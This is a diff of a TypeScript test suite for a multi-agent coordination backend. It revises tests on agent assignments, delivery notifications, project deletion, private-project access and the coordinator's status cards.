-    expect(await f.gapDeliveries()).toHaveLength(1)
-  })
-
-  it.each(['status', 'message'] as const)('does not block a delayed incident after the worker reports progress by %s', async progress => {
-    const f = await recoveryFixture(), detectedAt = Date.now() + 1000
-    const later = new SuperTabStore(db, () => detectedAt + 1)
-    const command: Command = progress === 'status'
-      ? { type: 'work.status', conversationId: f.group, assignmentId: f.assignmentId, status: 'working', result: null }
-      : { type: 'message.send', conversationId: f.group, text: 'Recovered and committed the next step', replyTo: null, recipientIds: [] }
-    await later.execute(host, f.tab, { operationId: randomUUID(), command }, f.worker)
-    const first = await f.append({ ...f.gap, gap: { incidentId: 'delayed_restart', reason: 'recording_restarted', detectedAt } })
-    await f.append({ ...f.gap, turnId: 'later_retry', previousEventId: first.eventId,
-      gap: { incidentId: 'delayed_restart', reason: 'recording_restarted', detectedAt } })
-    expect(await f.state()).toMatchObject({ status: 'working', result: null })
-    expect(await f.gapDeliveries()).toHaveLength(0)
-  })
-
-  it.each(['done', 'blocked', 'needs_human'] as const)('does not replace %s work or notify the Lead', async status => {
-    const f = await recoveryFixture()
-    if (status === 'done') {
-      const checkId = (await store.read(owner, f.tab)).state.conversations.find(c => c.id === f.group)!.checks[0]!.id
-      await run(f.tab, { type: 'work.check', conversationId: f.group, assignmentId: f.assignmentId, checkId,
-        passed: true, evidence: 'The fixture recorded its checkpoint' }, host, f.worker)
-    }
-    await run(f.tab, { type: 'work.status', conversationId: f.group, assignmentId: f.assignmentId,
-      status, result: 'Existing outcome' }, host, f.worker)
-    await store.native.append(host, f.tab, f.contextId, f.interruption())
-    expect(await f.state()).toMatchObject({ status, result: 'Existing outcome' })
-    expect(await f.gapDeliveries()).toHaveLength(0)
-  })
-
-  it('tells nobody of the coordinator\'s own gap, and blocks nothing, even when it holds active work', async () => {
-    const { tab, lead } = await fixture()
-    await run(tab, { type: 'work.define', conversationId: 'lead', brief: 'Lead task', checks: [{ description: 'Checked', independent: false }] })
-    await run(tab, { type: 'work.assign', conversationId: 'lead', agentId: lead })
-    await joinHost(tab)
-    const { contextId } = await store.native.open(host, tab, { operationId: randomUUID(), conversationId: 'lead', agentId: lead })
-    const receipt = await store.native.append(host, tab, contextId, { turnId: 'lead_restart', kind: 'gap', previousEventId: null,
-      text: '', truncated: false, interrupted: false,
-      gap: { incidentId: 'lead_restart', reason: 'recording_restarted', detectedAt: Date.now() + 1000 } }) as { eventId: string }
-    expect((await store.read(owner, tab)).state.conversations[0]!.assignment!.status).toBe('working')
-    expect(await db.superTabDelivery.findMany({ where: { messageId: receipt.eventId } })).toEqual([])
-  })
-
-  it('does not notify for a worker without an assignment', async () => {
-    const { tab } = await fixture()
-    const worker = (await run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId: randomUUID(),
-      name: 'Idle Engineer', configuration: config, lead: false })).result.agentId as string
-    const { contextId } = await store.native.open(owner, tab, { operationId: randomUUID(), conversationId: 'lead', agentId: worker })
-    const receipt = await store.native.append(host, tab, contextId, { turnId: 'idle_restart', kind: 'gap', previousEventId: null,
-      text: '', truncated: false, interrupted: false,
-      gap: { incidentId: 'idle_restart', reason: 'recording_restarted', detectedAt: Date.now() + 1000 } }) as { eventId: string }
-    expect((await store.read(owner, tab)).state.conversations[0]!.assignment).toBeNull()
-    expect(await db.superTabDelivery.findMany({ where: { messageId: receipt.eventId } })).toEqual([])
-  })
 })
 
 describe('Change agent on a Swarm member', () => {
@@ -474,10 +250,11 @@ describe('Change agent on a Swarm member', () => {
     const group = (await run(tab, { type: 'conversation.create', title: 'Replacement', brief: 'Continue work',
       checks: [{ description: 'Receives messages', independent: false }] })).result.conversationId as string
     await run(tab, { type: 'conversation.agent', conversationId: group, agentId: lead, present: true, lead: false })
-    await run(tab, { type: 'work.assign', conversationId: group, agentId: lead })
+    await storeAssignment(db, tab, group, lead)
     const receiptIds: string[] = []
+    const { say } = await crew(tab, lead)
     for (const status of ['queued', 'claimed', 'uncertain', 'answered']) {
-      const sent = await run(tab, { ...message(`Before ${status}`), recipientIds: [lead] } as Command)
+      const sent = await say(`Before ${status}`)
       const delivery = (await store.deliveries(host, tab, lead)).find(d => d.messageId === sent.result.messageId)!
       await db.superTabDelivery.update({ where: { id: delivery.id }, data: { status, ...(status !== 'queued' ? { claimId: `claim-${status}`, receipt: `receipt-${status}` } : {}),
         ...(status === 'claimed' ? { holdReason: 'team_busy', holdSince: new Date() } : {}) } })
@@ -500,49 +277,12 @@ describe('Change agent on a Swarm member', () => {
     const resent = (await store.deliveries(host, tab, lead)).find(d => d.id !== uncertain.id && !receiptIds.includes(d.id) && d.status === 'queued')!
     expect(resent).toMatchObject({ agentId: lead, status: 'queued' })
   })
-  it('revokes the replaced terminal\'s recording contexts and the turns of it still waiting for the Lead', async () => {
-    const { tab, lead } = await fixture()
-    const group = String((await run(tab, { type: 'conversation.create', title: 'Rebound', brief: 'Work', checks: [{ description: 'Done', independent: false }] })).result.conversationId)
-    const harnessId = randomUUID()
-    const worker = String((await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId, name: 'Worker',
-      configuration: config, lead: false })).result.agentId)
-    const { contextId } = await store.native.open(owner, tab, { operationId: randomUUID(), conversationId: group, agentId: worker })
-    await gapToCoordinator(tab, group, worker, contextId)
-    const turn = (await store.deliveries(host, tab, lead)).find(d => d.nativeContextId === contextId)!
-    await run(tab, { type: 'agent.rebind', agentId: worker, machineId: 'test-host', projectId: 'lead', previousHarnessId: harnessId,
-      harnessId: randomUUID(), configuration: config }, host, worker)
-    expect((await db.superTabNativeContext.findUniqueOrThrow({ where: { id: contextId } })).revoked).toBe(true)
-    expect((await db.superTabDelivery.findUniqueOrThrow({ where: { id: turn.id } })).status).toBe('cancelled')
-    await expect(store.delivery(host, tab, lead, turn.id, { type: 'claim', claimId: randomUUID() })).rejects.toMatchObject({ code: 'DELIVERY_REVOKED' })
-  })
-
   it('refuses a replacement already contributed in another tab', async () => {
     const first = await fixture(), second = await fixture()
     const previous = (await store.read(owner, first.tab)).state.agents[0]!
     const occupied = (await store.read(owner, second.tab)).state.agents[0]!
     await expect(run(first.tab, { type: 'agent.rebind', agentId: first.lead, machineId: 'test-host', projectId: 'lead',
       previousHarnessId: previous.harnessId, harnessId: occupied.harnessId, configuration: config }, host, first.lead)).rejects.toMatchObject({ code: 'SESSION_CONTRIBUTED' })
-  })
-})
-
-describe('five-part task persistence', () => {
-  it('stores structured tasks through the API and delivers all parts to the worker', async () => {
-    const { tab, lead } = await fixture()
-    const task = { goal: 'Keep drafts', changes: 'Persist pending edits', constraints: 'No dependencies', owns: ['backend/src/superTabs'] }
-    const checks = [{ description: 'Draft survives reconnect', independent: false }]
-    const created = await app.inject({ method: 'POST', url: `/api/super-tabs/${tab}/commands`,
-      headers: { authorization: `Bearer ${host.sub}` }, payload: { operationId: randomUUID(), asAgentId: lead,
-        command: { type: 'conversation.create', title: 'Drafts', task, checks } } })
-    expect(created.statusCode, created.body).toBe(200)
-    const group = created.json().data.result.conversationId as string
-    const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(), name: 'Worker', configuration: config, lead: false })).result.agentId as string
-    const row = (await store.read(owner, tab)).state.conversations.find(c => c.id === group)!
-    expect(row.task).toEqual(task)
-    expect(row.brief).toContain('Goal:\nKeep drafts')
-    await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })
-    const messages = (await store.messages(owner, tab, group, {})).messages
-    const delivered = messages.at(-1)!.text
-    for (const part of ['Goal:', 'Changes:', 'Constraints:', 'Owns:', 'Acceptance checks:', ...Object.values(task).flat(), checks[0]!.description]) expect(delivered).toContain(part)
   })
 })
 
@@ -553,8 +293,9 @@ describe('person removal notices', () => {
       checks: [{ description: 'Draft survives reconnect', independent: false }] })).result.conversationId as string
     const worker = (await run(tab, { type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Draft worker', configuration: config, lead: false })).result.agentId as string
-    await run(tab, { type: 'conversation.agent', conversationId: 'lead', agentId: worker, present: true, lead: false })
-    await run(tab, { type: 'work.assign', conversationId: group, agentId: worker })
+    // A member of the project chat stored before #2207, so the removal tells its coordinator there too.
+    await seat(tab, worker)
+    await storeAssignment(db, tab, group, worker)
     const operationId = randomUUID(), command: Command = { type: 'agent.remove', agentId: worker }
     const first = await run(tab, command, owner, undefined, operationId)
     const notices = await db.superTabMessage.findMany({ where: { tabId: tab, text: { contains: 'removed' } } })
@@ -583,6 +324,8 @@ describe('agent member identities', () => {
     expect(agent.displayName).not.toBe('Lead')
     expect(await run(tab, command, owner, undefined, operationId)).toEqual(added)
     expect((await store.read(owner, tab)).lastChangedAt).toBe(first.lastChangedAt)
+    // Posting there as a member of the project chat stored before #2207 (agent.add no longer seats it there).
+    await seat(tab, agentId)
     await run(tab, message('The plan is ready.'), host, agentId)
     await run(tab, { type: 'agent.remove', agentId })
     const rows = (await store.messages(owner, tab, 'lead', {})).messages
@@ -599,7 +342,8 @@ describe('deleting abandoned swarm projects', () => {
     const create = { type: 'project.create' as const, name: 'Abandoned private project', visibility: 'private' as const, brief: '' }
     const { projectId, conversationId } = (await run(tab, create, owner, undefined, createId)).result as { projectId: string; conversationId: string }
     const group = String((await run(tab, { type: 'conversation.create', projectId, title: 'Offline work', brief: '', checks: [] })).result.conversationId)
-    const send = { ...message('Private unfinished draft'), conversationId: group } as Command
+    // A person's write there (a person posts in no project's channel or task, agentsOnly.test.ts).
+    const send: Command = { type: 'conversation.rename', conversationId: group, title: 'Unfinished draft' }
     const sendId = randomUUID()
     await run(tab, send, owner, undefined, sendId)
     await run(tab, { type: 'invite.create', email: 'abandoned@example.com', role: 'collaborator', conversationId })
@@ -611,12 +355,12 @@ describe('deleting abandoned swarm projects', () => {
     expect(await run(tab, command, owner, undefined, deleteId)).toEqual(response.json().data)
     const state = (await store.read(owner, tab)).state
     expect(state.projects!.map(p => p.id)).toEqual(['lead'])
-    expect(state.conversations.map(c => c.id)).toEqual(['lead'])
+    // The PM's own chat with its person (Swarm v4) is no project's, and stays.
+    expect(state.conversations.filter(c => c.kind !== 'agent-chat').map(c => c.id)).toEqual(['lead'])
     // An invitation is to the Swarm: it moves to the project that is left rather than disappearing.
     expect(state.invitations.map(i => [i.email, i.conversationId])).toEqual([['abandoned@example.com', 'lead']])
     for (const id of [conversationId, group]) {
       await expect(store.messages(owner, tab, id, {})).rejects.toMatchObject({ code: 'NOT_FOUND' })
-      await expect(store.attempts(owner, tab, id)).rejects.toMatchObject({ code: 'NOT_FOUND' })
     }
     await expect(run(tab, send, owner, undefined, sendId)).rejects.toMatchObject({ code: 'NOT_FOUND' })
     await expect(run(tab, create, owner, undefined, createId)).rejects.toMatchObject({ code: 'NOT_FOUND' })
@@ -659,8 +403,10 @@ describe('deleting abandoned swarm projects', () => {
   // Scholes's goals, piece 5: the heavy work a start declares is stored with it and read back, so later routes count it.
   it('stores the heavy work a start declares and reads it back with the start and the Super Tab', async () => {
     const { tab } = await fixture()
-    const { conversationId } = (await run(tab, { type: 'project.create', name: 'Heavy start', visibility: 'public', brief: '' })).result as { conversationId: string }
-    const request = { conversationId, machineId: 'test-host', engine: 'codex', name: 'Builder', cwd: '/work', worktree: true, heavy: ['build'],
+    const { projectId } = (await run(tab, { type: 'project.create', name: 'Heavy start', visibility: 'public', brief: '' })).result as { projectId: string }
+    // In a task of the project: the project chat holds only its coordinator among agents (#2207).
+    const conversationId = String((await run(tab, { type: 'conversation.create', projectId, title: 'Build', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId, machineId: OWN_MAC, engine: 'codex', name: 'Builder', cwd: '/work', worktree: true, heavy: ['build'],
       requirements: { memoryBytes: 4e9, diskBytes: 15e9, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
     const startId = String((await run(tab, { type: 'agent.start', request } as Command)).result.startId)
     expect((await store.start(owner, tab, startId)).request).toMatchObject({ heavy: ['build'] })
@@ -669,8 +415,10 @@ describe('deleting abandoned swarm projects', () => {
 
   it('refuses pending starts and prevents a failed start from joining after deletion', async () => {
     const { tab } = await fixture()
-    const { projectId, conversationId } = (await run(tab, { type: 'project.create', name: 'Failed start', visibility: 'public', brief: '' })).result as { projectId: string; conversationId: string }
-    const request = { conversationId, machineId: 'test-host', engine: 'codex', name: 'Builder', cwd: '/work', worktree: true,
+    const { projectId } = (await run(tab, { type: 'project.create', name: 'Failed start', visibility: 'public', brief: '' })).result as { projectId: string }
+    // In a task of the project: the project chat holds only its coordinator among agents (#2207).
+    const conversationId = String((await run(tab, { type: 'conversation.create', projectId, title: 'Build', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId, machineId: OWN_MAC, engine: 'codex', name: 'Builder', cwd: '/work', worktree: true,
       requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
     const startId = String((await run(tab, { type: 'agent.start', request })).result.startId)
     await expect(run(tab, { type: 'project.delete', projectId })).rejects.toMatchObject({ code: 'STARTS_PENDING' })
@@ -688,9 +436,7 @@ describe('deleting abandoned swarm projects', () => {
       name: 'Private lead', configuration: config, lead: true })).result.agentId)
     await joinHost(tab)
     await run(tab, { type: 'project.sharing', projectId, visibility: 'private', memberIds: [host.sub] })
-    const context = await store.native.open(host, tab, { operationId: randomUUID(), conversationId, agentId })
     await run(tab, { type: 'project.delete', projectId })
-    await expect(store.native.read(host, tab, context.contextId)).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
     expect(await store.mayObserve(owner, tab, 'test-host', harnessId, host.sub)).toBe(false)
     await expect(run(tab, { type: 'agent.add', conversationId: 'lead', machineId: 'test-host', harnessId,
       name: 'Moved lead', configuration: config, lead: false })).rejects.toMatchObject({ code: 'PROJECT_SESSION' })
@@ -713,57 +459,59 @@ describe('deleting abandoned swarm projects', () => {
 })
 
 describe('private swarm projects on the real control API', () => {
+  // Swarm v3 (task #4120): the machine is its person's own, and that person starts its agents there, in their own account.
   it('uses one contributed machine across projects with a separate authorized checkout for each', async () => {
     const { tab } = await fixture()
     const invitation = await run(tab, { type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
     await run(tab, { type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
-    const machineId = 'swarm-pool-host'
-    await db.machine.create({ data: { machineId, userId: host.sub, apiKey: 'fixture-swarm-pool', managerId: 'fixture',
+    const machineId = 'swarm-pool-owner'
+    await db.machine.create({ data: { machineId, userId: owner.sub, apiKey: 'fixture-swarm-pool-owner', managerId: 'fixture',
       autonomousEnv: 'prod', authMode: 'remote' } })
-    const team = await teamMachine(machineId)
+    onTestFinished(async () => { await db.machine.deleteMany({ where: { machineId } }) })
     const project = (await run(tab, { type: 'project.create', name: 'Second project', visibility: 'private', brief: '' })).result
     const conversationId = String(project.conversationId), projectId = String(project.projectId)
     await run(tab, { type: 'agent.add', conversationId, machineId: 'test-host', harnessId: randomUUID(),
       name: 'Project lead', configuration: config, lead: true,
       project: { cwd: '/lead/second', repositoryUrl: 'https://github.com/example/second' } })
     await run(tab, { type: 'machine.contribute', machineId, name: 'Shared capacity', cwd: '/swarm-root',
-      engines: ['codex'], maxAgents: 2 }, host)
-    await expect(run(tab, { type: 'tab.project', machineId, project: { cwd: '/unrelated', repositoryUrl: null } }))
-      .rejects.toMatchObject({ code: 'HOST_REQUIRED' })
-    const request = { conversationId, machineId, engine: 'codex', name: 'Builder',
+      engines: ['codex'], maxAgents: 2 })
+    // Builders start in each project's task: the project chat holds only its coordinator among agents (#2207).
+    const task = String((await run(tab, { type: 'conversation.create', projectId, title: 'Second work', brief: '', checks: [] })).result.conversationId)
+    const leadTask = String((await run(tab, { type: 'conversation.create', title: 'Lead work', brief: '', checks: [] })).result.conversationId)
+    const request = { conversationId: task, machineId, engine: 'codex', name: 'Builder',
       cwd: `/swarm-root/${projectId}`, worktree: true,
       requirements: { memoryBytes: 0, diskBytes: 0, maxCpuPercent: 100, tools: [], devices: [], quotaRequired: false } }
     await expect(run(tab, { type: 'agent.start', request })).rejects.toMatchObject({ code: 'PROJECT_CONTRIBUTION' })
     await run(tab, { type: 'machine.contribute', machineId, name: 'Shared capacity', cwd: '/swarm-root',
-      scope: 'swarm', engines: ['codex'], maxAgents: 2 }, host)
-    const pool = (await poolRows(store, team.session, machineId))[0]!
-    await store.observeMachine(team.session, tab, machineId, { generation: pool.machine.generation,
+      scope: 'swarm', engines: ['codex'], maxAgents: 2 })
+    const pool = (await poolRows(store, owner, machineId))[0]!
+    await store.observeMachine(owner, tab, machineId, { generation: pool.machine.generation,
       resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9, projectDiskFreeBytes: 100e9,
         diskFreeBytes: 100e9, diskTotalBytes: 500e9, deviceType: 'Laptop', chip: 'Fixture CPU', os: 'macOS', gpuPercent: null },
-      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [], privacy: team.privacy })
-    expect(pool.projects).toEqual([])
+      quotas: [], tools: { git: true }, runningHarnessIds: [], stoppedHarnessIds: [] })
     await expect(run(tab, { type: 'agent.start', request: { ...request, cwd: '/swarm-root/lead' } }))
       .rejects.toMatchObject({ code: 'OUTSIDE_CONTRIBUTION' })
     const secondStart = (await run(tab, { type: 'agent.start', request })).result.startId as string
-    await run(tab, { type: 'agent.start', request: { ...request, conversationId: 'lead', cwd: '/swarm-root/lead' } })
-    const queued = (await poolRows(store, team.session, machineId))[0]!
+    await run(tab, { type: 'agent.start', request: { ...request, conversationId: leadTask, cwd: '/swarm-root/lead' } })
+    const queued = (await poolRows(store, owner, machineId))[0]!
     expect(queued.starts).toHaveLength(2)
     expect(queued.projects!.find(p => p.id === projectId)).toMatchObject({
       repository: { machineId: 'test-host', cwd: '/lead/second', repositoryUrl: 'https://github.com/example/second' },
-      conversationIds: [conversationId],
+      conversationIds: [conversationId, task],
     })
     expect((await store.read(host, tab)).state.projects!.some(p => p.id === projectId)).toBe(false)
-    const hostRun = (command: Command) => store.execute(team.session, tab, { operationId: randomUUID(), command }, undefined, machineId)
+    const hostRun = (command: Command) => store.execute(owner, tab, { operationId: randomUUID(), command }, undefined, machineId)
     await hostRun({ type: 'agent.startDispatch', startId: secondStart })
     const started = await hostRun({ type: 'agent.started', startId: secondStart, harnessId: 'second-builder', configuration: config })
     await hostRun({ type: 'agent.startSettled', startId: secondStart, warning: null })
     const agentId = String(started.result.agentId)
-    expect((await store.read(team.session, tab, agentId)).state.conversations.map(c => c.id)).toEqual([conversationId])
-    await expect(store.messages(team.session, tab, 'lead', {}, agentId)).rejects.toMatchObject({ code: 'NOT_FOUND' })
+    // Its project's chat and the task it started in, nothing of the other project's.
+    expect((await store.read(owner, tab, agentId)).state.conversations.map(c => c.id)).toEqual([conversationId, task])
+    await expect(store.messages(owner, tab, 'lead', {}, agentId)).rejects.toMatchObject({ code: 'NOT_FOUND' })
     expect(await db.machineShare.findUnique({ where: { machineId } })).toBeNull()
   })
 
-  it('revokes chat, terminal observers, native contexts and old receipts together', async () => {
+  it('revokes chat, terminal observers and old receipts together', async () => {
     const { tab } = await fixture()
     await invite(tab)
     const project = (await run(tab, { type: 'project.create', name: 'Private project', visibility: 'private', brief: '' })).result
@@ -771,14 +519,16 @@ describe('private swarm projects on the real control API', () => {
     const harnessId = randomUUID()
     const agentId = String((await run(tab, { type: 'agent.add', conversationId, machineId: 'test-host', harnessId,
       name: 'Private lead', configuration: config, lead: true })).result.agentId)
-    // Its terminal observers are checked on a Builder's terminal: nobody but its machine's owner watches a Lead (Critical 1).
+    // Its terminal observers are checked on a Builder's terminal: nobody but its machine's owner watches a Lead (Critical 1). The
+    // Builder is in the project's task, as the project chat holds only its coordinator among agents (#2207).
     const workerHarness = randomUUID()
-    const workerId = String((await run(tab, { type: 'agent.add', conversationId, machineId: 'test-host', harnessId: workerHarness,
+    const task = String((await run(tab, { type: 'conversation.create', projectId, title: 'Private work', brief: '', checks: [] })).result.conversationId)
+    const workerId = String((await run(tab, { type: 'agent.add', conversationId: task, machineId: 'test-host', harnessId: workerHarness,
       name: 'Private builder', configuration: config, lead: false })).result.agentId)
-    await run(tab, { ...message('Private result'), conversationId } as Command)
+    // Its PM's post: only agents post in a project's channel (agentsOnly.test.ts).
+    await run(tab, { ...message('Private result'), conversationId } as Command, host, agentId)
     expect((await store.read(peer, tab)).state.projects!.map(p => p.id)).not.toContain(projectId)
     await expect(store.messages(peer, tab, conversationId, {})).rejects.toMatchObject({ code: 'NOT_FOUND' })
-    await expect(store.native.open(peer, tab, { operationId: randomUUID(), conversationId, agentId: workerId })).rejects.toMatchObject({ code: 'NOT_FOUND' })
     expect(await store.mayObserve(peer, tab, 'test-host', workerHarness, host.sub)).toBe(false)
     expect((await rosterRows(store, host, 'test-host')).find(t => t.agent?.id === workerId)!.observers.map(p => p.userId)).not.toContain(peer.sub)
     await expect(store.messages(host, tab, 'lead', {}, agentId)).rejects.toMatchObject({ code: 'NOT_FOUND' })
@@ -786,14 +536,12 @@ describe('private swarm projects on the real control API', () => {
     await run(tab, { type: 'project.sharing', projectId, visibility: 'private', memberIds: [peer.sub] })
     expect((await store.messages(peer, tab, conversationId, {})).messages.map(m => m.text)).toContain('Private result')
     expect(await store.mayObserve(peer, tab, 'test-host', workerHarness, host.sub)).toBe(true)
-    // A member's terminal, also on the Builder: only its machine's owner drives a Lead.
-    const context = await store.native.open(peer, tab, { operationId: randomUUID(), conversationId, agentId: workerId })
-    const command = { ...message('Shared review'), conversationId } as Command
+    // A write of the person's own there, retried once the project is no longer shared with them.
+    const command: Command = { type: 'conversation.rename', conversationId: task, title: 'Shared review' }
     const operationId = randomUUID()
     await run(tab, command, peer, undefined, operationId)
     await run(tab, { type: 'project.sharing', projectId, visibility: 'private', memberIds: [] })
     await expect(run(tab, command, peer, undefined, operationId)).rejects.toMatchObject({ code: 'NOT_FOUND' })
-    await expect(store.native.read(host, tab, context.contextId)).rejects.toMatchObject({ code: 'NATIVE_CONTEXT_REVOKED' })
     expect(await store.mayObserve(peer, tab, 'test-host', workerHarness, host.sub)).toBe(false)
 
     // Removing a roster row, here with its project, cannot erase the terminal's private history.
@@ -803,62 +551,43 @@ describe('private swarm projects on the real control API', () => {
       name: 'Moved lead', configuration: config, lead: false })).rejects.toMatchObject({ code: 'PROJECT_SESSION' })
   })
 
-  // Quiet project chats (Dee, 2026-10-31): a work group's change of state wakes the coordinator at most once every 15 minutes,
-  // an ordinary message never; its report sets the project's status card and posts nothing; the digest is on by default.
-  it('wakes the coordinator only on work changes, at most every 15 minutes, and keeps its report in the status card', async () => {
-    // 14:00 in Vietnam: the default digest starts tomorrow at 08:00.
+  // Quiet project chats (Dee, 2026-10-31; task #3593): the server writes the status card's lines from task state and wakes the coordinator
+  // for none of them; its report adds its own lines after them and posts nothing.
+  it('wakes the coordinator for no work change and shows its own lines alone on the card', async () => {
+    // 14:00 in Vietnam.
     let now = Date.UTC(2026, 9, 31, 7, 0)
     const timed = new SuperTabStore(db, () => now)
     const tab = (await timed.create(owner, randomUUID(), 'Updates', 'public')).id
-    const execute = (command: Command, asAgentId?: string) => timed.execute(asAgentId ? host : owner, tab,
-      { operationId: randomUUID(), command }, asAgentId)
+    const execute = (command: Command | StoredCreate, asAgentId?: string) => command.type === 'conversation.create'
+      ? storeCreate(db, tab, command, asAgentId ? host : owner, asAgentId) : timed.execute(asAgentId ? host : owner, tab, { operationId: randomUUID(), command }, asAgentId)
     const lead = String((await execute({ type: 'agent.add', conversationId: 'lead', machineId: 'test-host',
       harnessId: randomUUID(), name: 'Lead', configuration: config, lead: true })).result.agentId)
     const updates = async () => (await timed.deliveries(host, tab, lead)).filter(d => d.conversationId === 'lead')
     const chat = async () => db.superTabMessage.findMany({ where: { tabId: tab, conversationId: 'lead' } })
+    const status = async () => (await timed.read(owner, tab)).state.projects!.find(p => p.id === 'lead')!.status
     expect(await updates()).toEqual([])
     const group = String((await execute({ type: 'conversation.create', title: 'Work', brief: 'Implement it',
       checks: [{ description: 'Verified', independent: true }] })).result.conversationId)
-    // Five minutes on, so a burst of changes is one wake-up (the quiet poll's 30 s fit within that).
-    now += 299_999
+    // No wake-up however long it waits: the poll that used to carry the card's request finds nothing.
+    now += 330_000
     expect(await updates()).toEqual([])
-    now += 30_001
-    const polls = await Promise.all(Array.from({ length: 3 }, () => updates()))
-    const ids = new Set(polls.flat().map(d => d.id))
-    expect(ids.size).toBe(1)
-    expect((await chat()).map(m => (m.source as Record<string, unknown>)?.kind)).toEqual(['update-request'])
-    await execute({ ...message('New evidence'), conversationId: group } as Command)
     now += 900_000
-    expect((await updates()).map(d => d.id)).toEqual([...ids])
-    // The Lead reports through what it read of each workgroup: the card, and nothing in the chat.
-    const read = (await timed.read(owner, tab)).state.conversations.find(c => c.id === group)!
-    const card = 'Work: implementation ready, verification next.'
-    await execute({ type: 'project.report', projectId: 'lead', through: { [group]: read.lastMessageSequence }, text: card }, lead)
+    expect(await updates()).toEqual([])
+    // After the row naming who added the Lead (#2207); a task no message asked for posts nothing in the chat (#2925).
+    expect((await chat()).map(m => (m.source as Record<string, unknown>)?.kind)).toEqual(['system'])
+    // The server writes no line for the task (Swarm v4, 2026-11-10).
+    expect(await status()).toBeUndefined()
+    // The Lead's report is the card, and posts nothing.
+    const card = 'Freeze starts Friday.'
+    await execute({ type: 'project.report', projectId: 'lead', text: card }, lead)
     expect(await updates()).toEqual([])
     expect((await chat()).filter(m => m.text === card || (m.source as Record<string, unknown>)?.kind === 'project-report')).toEqual([])
-    expect((await timed.read(owner, tab)).state.projects!.find(p => p.id === 'lead')!.status).toEqual({ text: card, at: new Date(now).toISOString(), by: lead })
-    // An ordinary message, here an hour of them, wakes nobody.
-    await execute({ ...message('Tests passed'), conversationId: group } as Command)
-    now += 3_600_000
+    expect((await status())!.text).toBe(card)
+    // An ordinary message, the Lead's, wakes nobody.
+    await execute({ ...message('Tests passed'), conversationId: group } as Command, lead)
+    now += 900_000
     expect(await updates()).toEqual([])
-    // Two changes within 15 minutes: one wake-up now, the second waits for the next window.
-    await execute({ type: 'conversation.create', title: 'Docs', brief: 'Write them', checks: [{ description: 'Read', independent: false }] })
-    now += 300_000
-    expect(await updates()).toHaveLength(1)
-    const answered = (await timed.read(owner, tab)).state.conversations.filter(c => c.title === 'Docs' || c.id === group)
-    await execute({ type: 'project.report', projectId: 'lead', through: Object.fromEntries(answered.map(c => [c.id, c.lastMessageSequence])), text: null }, lead)
-    expect(await updates()).toEqual([])
-    await execute({ type: 'conversation.merged', conversationId: group, pullRequestUrl: 'https://github.com/example/app/pull/7' })
-    now += 600_000
-    expect(await updates()).toEqual([])
-    now += 300_000
-    expect(await updates()).toHaveLength(1)
-    // The card stayed through the acknowledgement, and the morning digest comes by default at 08:00 the next day.
-    expect((await timed.read(owner, tab)).state.projects!.find(p => p.id === 'lead')!.status!.text).toBe(card)
-    expect((await chat()).some(m => (m.source as Record<string, unknown>)?.kind === 'digest-request')).toBe(false)
-    now = Date.UTC(2026, 10, 1, 1, 0) + 30_000
-    await updates()
-    expect((await chat()).filter(m => (m.source as Record<string, unknown>)?.kind === 'digest-request')).toHaveLength(1)
+    expect((await status())!.text).toBe(card)
   })
 })
 
@@ -867,8 +596,8 @@ describe('since when a worker is down', () => {
     let now = 1_000_000
     const timed = new SuperTabStore(db, () => now)
     const tab = (await timed.create(owner, randomUUID(), 'Down since', 'public')).id
-    const execute = (command: Command, user = owner, asAgentId?: string) =>
-      timed.execute(user, tab, { operationId: randomUUID(), command }, asAgentId)
+    const execute = (command: Command | StoredCreate, user = owner, asAgentId?: string) => command.type === 'conversation.create'
+      ? storeCreate(db, tab, command, user, asAgentId) : timed.execute(user, tab, { operationId: randomUUID(), command }, asAgentId)
     const invitation = await execute({ type: 'invite.create', email: host.email, role: 'collaborator', conversationId: 'lead' })
     await execute({ type: 'invite.accept', inviteId: invitation.result.inviteId as string }, host)
     await execute({ type: 'machine.contribute', machineId: 'test-host', name: 'Host', cwd: '/repo', engines: ['codex'], maxAgents: 4 }, host)
@@ -877,9 +606,10 @@ describe('since when a worker is down', () => {
       name: 'Lead', configuration: config, lead: true })).result.agentId)
     const group = String((await execute({ type: 'conversation.create', title: 'Ship the parser', brief: 'Implement it',
       checks: [{ description: 'Verified', independent: false }] })).result.conversationId)
+    // The machine's own person adds its worker, which then runs in their own account (Swarm v3, task #4120).
     const worker = String((await execute({ type: 'agent.add', conversationId: group, machineId: 'test-host', harnessId: workerHarness,
-      name: 'Worker', configuration: config, lead: false })).result.agentId)
-    const assignmentId = String((await execute({ type: 'work.assign', conversationId: group, agentId: worker })).result.assignmentId)
+      name: 'Worker', configuration: config, lead: false }, host)).result.agentId)
+    const assignmentId = (await storeAssignment(db, tab, group, worker, now)).id
     const generation = (await poolRows(timed, host, 'test-host')).find(p => p.tabId === tab)!.machine.generation
     const observe = (running: string[], stopped: string[] = []) => timed.observeMachine(host, tab, 'test-host', { generation,
       resources: { cpuPercent: 10, memoryTotalBytes: 32e9, memoryUsedBytes: 4e9, diskFreeBytes: 120e9, diskTotalBytes: 500e9,
@@ -914,7 +644,8 @@ describe('since when a worker is down', () => {
     await f.timed.stopped(host, f.tab, f.assignmentId, 'fixture-native-stop')
     expect(await f.downSince(f.worker)).toBe(iso(stopped))
     f.clock.now += 1_000
-    await f.observe([f.leadHarness], [f.workerHarness])
+    // Its session is still not listed (a stopped list would remove the agent, superTabLiveness.test.ts).
+    await f.observe([f.leadHarness])
     expect(await f.downSince(f.worker)).toBe(iso(stopped))
     await f.observe([f.leadHarness, f.workerHarness])
     expect(await f.downSince(f.worker)).toBeUndefined()
@@ -936,132 +667,64 @@ describe('since when a worker is down', () => {
 })
 
